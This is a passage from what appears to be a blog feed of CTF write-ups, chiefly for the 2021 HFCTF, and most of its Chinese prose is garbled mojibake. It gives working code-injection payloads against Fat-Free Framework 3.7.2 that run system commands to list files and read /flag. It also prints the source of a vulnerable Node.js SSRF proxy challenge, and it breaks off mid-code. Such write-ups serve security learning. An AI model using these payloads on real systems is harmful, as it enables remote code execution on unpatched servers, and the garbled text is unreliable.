SSRF ç»™å†…ç½‘çš„ Netflix Conductor æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼ŒæŠŠ flag æ‰“åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚</li></ol><p>è¿™é¢˜å †çš„è€ƒç‚¹æœ‰äº¿ç‚¹ç‚¹å¤šï¼Œæ„Ÿè§‰æ”¾åœ¨ 8h çš„æ¯”èµ›é‡Œæ—¶é—´ç¡®å®ä¸å¤§å¤Ÿã€‚</p><p>è™½ç„¶ç»™å¤Ÿæ—¶é—´ä¹Ÿå¾ˆéš¾åšå‡ºæ¥å°±æ˜¯äº†<em>ï¼ˆå–µå–µè‡ªå·±çˆ¬äº†</em></p><p>ä¸è¿‡æ€ä¹ˆè¯´ï¼Œå¤ç°è¿™é¢˜çš„è¿‡ç¨‹ä¸­ç¡®å®å­¦åˆ°äº†è®¸å¤šâ€¦â€¦</p><p>å¥½ä¹…æ²¡åšè¿™ä¹ˆé¡¶çš„é¢˜ç›®äº†ï¼ˆ</p><br><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ WriteUp</title>
      <link href="2021/04/04/CTF_2021HFCTF/"/>
      <url>2021/04/04/CTF_2021HFCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234131332.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“</strong></p><p>2021å¹´4æœˆ3æ—¥ 10:00-18:00</p><p><a href="https://www.ichunqiu.com/2021hfctf">https://www.ichunqiu.com/2021hfctf</a></p></blockquote><p>è²Œä¼¼æœ‰ä¸€æ®µæ—¶é—´æ²¡æ¥æ‰“ CTF äº†ï¼Œæ‰‹æœ‰ç‚¹ç”Ÿäº†ã€‚</p><p>ä»Šå¹´çš„è™ç¬¦æ¥çš„æœ‰ç‚¹æ—©ï¼Œè¿˜èµ¶ä¸Šäº†æ¸…æ˜å‡æœŸï¼Œå¤§å®¶éƒ½æ¯”è¾ƒå¿™ï¼Œå°±æ¥éšæ„çœ‹çœ‹é¢˜å¥½äº†å§ï¼ˆ</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><blockquote><p>å¸ˆå‚…ä»¬å¸¸è¯´ï¼Œè¦å–„äºå­¦ä¹ ï¼Œç»†è‡´å…¥å¾®ï¼›å¸ˆå‚…ä»¬ä¹Ÿå¸¸è¯´ï¼Œè¦å–„äºåˆ†äº«ï¼Œæ€»ç»“å½’çº³ã€‚</p><p>2021å¹´3æœˆ28æ—¥ï¼ŒPHPç»´æŠ¤çš„å®˜æ–¹GitæœåŠ¡å™¨ git.php.net è¢«è¢­å‡»ï¼Œå…¶Gitä»“åº“é­åˆ°æ¶æ„ç¯¡æ”¹ã€‚å¦‚æœå¼€å‘è€…ä½¿ç”¨è¿™äº›é­åˆ°ç¯¡æ”¹çš„æºä»£ç è¿›è¡Œç½‘é¡µçš„å¼€å‘çš„è¯ï¼Œç½‘ç«™å°±ä¼šåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¢«æ„ŸæŸ“ã€‚</p></blockquote><p>å‚è€ƒæ–°é—» <a href="https://www.freebuf.com/news/267983.html">PHPçš„GitæœåŠ¡å™¨è¢«å…¥ä¾µï¼Œæºä»£ç è¢«æ·»åŠ åé—¨</a></p><p>PHP å®˜æ–¹ï¼š<a href="https://news-web.php.net/php.internals/113838">Changes to Git commit workflow</a></p><p><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d</a></p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403144902442.png"></p><p>æˆ–è€… <a href="http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6">http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6</a></p><p>ç›´æ¥åœ¨ header æ‰“å°±å¥½äº†ã€‚æ³¨æ„æ˜¯ä¸¤ä¸ª<code>t</code>ã€‚</p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403144908239.png" alt="payload"></p><h3 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h3><blockquote><p>æ˜¯ç¼ºé™·è¿˜æ˜¯æ¼æ´å‘¢ã€‚</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// Kickstart the framework</span><span class="token variable">$f3</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/base.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f3</span><span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DEBUG'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">float</span><span class="token punctuation">)</span><span class="token constant">PCRE_VERSION</span><span class="token operator">&lt;</span><span class="token number">8.0</span><span class="token punctuation">)</span>    <span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PCRE version is out of date'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Load configuration</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$f3</span><span class="token operator">-&gt;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f3</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>æ˜¯ <a href="https://fatfreeframework.com/"><em>Fat-Free Framework</em></a> ï¼Œä¸€æŸ¥å‘ç° 3.7.1 ç‰ˆæœ¬å­˜åœ¨ RCE æ¼æ´ <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5203">CVE-2020-5203</a>ã€‚</p><p>ä½†è¿™ä¸ªæ¼æ´åœ¨ 3.7.2 ä¿®å¤äº†ã€‚</p><p>æ ¹æ® <code>/lib/CHANGELOG.md</code>ï¼Œå¾—çŸ¥é¢˜ç›®ç”¨åˆ°çš„ç‰ˆæœ¬æ˜¯ <code>3.7.2 (28 May 2020)</code></p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403164308925.png"></p><p>æŸ¥çœ‹æºç ï¼Œå½“å¯¹ä¸å¯è®¿é—®çš„å±æ€§è°ƒç”¨ <code>unset()</code> æ—¶<code>__unset()</code>ä¼šè¢«è°ƒç”¨ã€‚</p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165119222.png"></p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165127320.png"></p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165041484.png"></p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234404768.png"></p><p>åœ¨ <code>clear</code> é‡Œæœ‰ <code>eval</code>ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œä½†éœ€è¦æœ‰ <code>$parts[1]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">init</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">// Reset global to default value</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hive</span><span class="token punctuation">[</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">init</span><span class="token punctuation">[</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$val</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(\$hive)/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'$this-&gt;hive'</span><span class="token punctuation">,</span>                      <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'@hive.'</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'unset('</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">session_commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.var'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">// Remove from cache</span>        <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å†çœ‹ changelog</p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165248921.png"></p><p>æ ¹æ® <a href="https://github.com/bcosca/fatfree/issues/1206">https://github.com/bcosca/fatfree/issues/1206</a></p><p><a href="https://github.com/bcosca/fatfree/issues/1191">https://github.com/bcosca/fatfree/issues/1191</a></p><p>æ­£åˆ™åŒ¹é…å¯¹ <code>[]</code> å¤„ç†ä¸å½“ï¼Œäºæ˜¯æ„é€  payload</p><pre class="language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);phpinfo(</code></pre><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163552160.png"></p><pre class="language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('ls /'</code></pre><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163641868.png"></p><pre class="language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('cat /flag'</code></pre><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163713448.png"></p><p><code>flag{dfc91022-dc9d-481a-8b46-cff1ce6e51be}</code></p><h3 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h3><blockquote><p>å¼€å‘äº†ä¸€ä¸ªå…¬å¸å†…éƒ¨çš„è¯·æ±‚ä»£ç†ç½‘ç«™ï¼Œå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä½†æ¥ä¸åŠäº†è¿˜æ˜¯å…ˆä¸Šçº¿å§ï¼ˆâ”€.â”€||ï¼‰</p><p><a href="http://8.140.152.226:47921/">http://8.140.152.226:47921/</a></p><p><strong>hint:</strong> /sourceå­˜åœ¨æºç æ³„éœ²ï¼›/proxyå­˜åœ¨ssrf</p></blockquote><p>ï¼ˆè¿™æ˜¯ä¸€é“é›¶è§£çš„é¢˜ç›®â€¦â€¦</p><p>è®¿é—® <code>/source</code> å¾—åˆ°æºç ï¼Œå•Šæ˜¯ NodeJSã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span><span class="token keyword">const</span> isIp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-ip'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token constant">IP</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">)</span><span class="token keyword">const</span> UrlParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url-parse'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span>sha256<span class="token punctuation">,</span> hint<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./utils'</span><span class="token punctuation">)</span><span class="token keyword">const</span> salt <span class="token operator">=</span> <span class="token string">'nooooooooodejssssssssss8_issssss_beeeeest'</span><span class="token keyword">const</span> adminHash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token keyword">function</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> response    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[|\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">isIp</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">IP</span><span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>pathname    <span class="token keyword">return</span> <span class="token operator">!</span>pathname<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">OTHER_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token constant">WAF_LISTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token constant">OTHER_WAF</span><span class="token punctuation">,</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">,</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">]</span> router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password <span class="token operator">||</span> username <span class="token operator">===</span> password <span class="token operator">||</span> username<span class="token punctuation">.</span>length <span class="token operator">===</span> password<span class="token punctuation">.</span>length <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">=</span> hash <span class="token operator">===</span> adminHash        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>admin<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token constant">WAF_LISTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">waf</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>a<span class="token operator">&amp;&amp;</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'WAF'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">"Here is the waf..."</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// test url</span>    <span class="token comment">// not implemented here</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">"https://postman-echo.com/post"</span>    <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">"Something needs to be implemented"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'You can only use proxy to aceess here!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Search Success'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>    <span class="token keyword">const</span> method <span class="token operator">=</span> 